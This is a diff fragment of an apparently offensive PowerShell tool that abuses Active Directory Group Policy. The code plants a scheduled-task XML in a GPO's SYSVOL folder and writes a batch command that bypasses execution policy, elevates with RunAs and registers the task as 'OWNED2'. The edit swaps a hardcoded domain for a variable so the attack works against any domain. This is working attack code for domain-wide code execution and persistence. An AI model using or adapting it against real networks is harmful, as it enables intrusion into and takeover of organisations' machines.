@@ -190,7 +190,7 @@ Parameters:
     }
     elseif($validatesecondxml.StartsWith("<?xml version")){
         $green+" Second XML File is valid!."
-        $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\$domain\sysvol\noteasy.local\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
+        $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\$domain\sysvol\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
         Set-Content -Path .\add.bat -Value $cont
         New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
         Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
